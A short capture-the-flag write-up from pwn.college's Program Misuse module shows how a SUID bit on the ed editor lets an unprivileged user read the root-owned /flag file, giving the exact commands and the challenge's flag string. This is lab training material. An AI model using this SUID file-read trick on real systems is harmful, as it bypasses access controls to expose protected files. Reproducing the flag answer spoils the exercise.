---
layout: page
title: "Challenge Name: ed"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/ed`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/ed
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/ed
```

- The `s` in `-rws` indicates it's a SUID binary.
- `ed` runs with **root privileges**.

## 🚀 Exploitation

The `ed` command is a line-oriented text editor in Unix/Linux — it's one of the oldest editors, and it's still present on nearly all Unix-like systems. I

When the ed termianl arise we can use p to print the content of /flag

```bash
ed /flag
p
```

Output:
```
pwn.college{EmquctdrjrQwCPgCvcux1o6UI-8.dhzNxwSM0IzMyEzW}
```
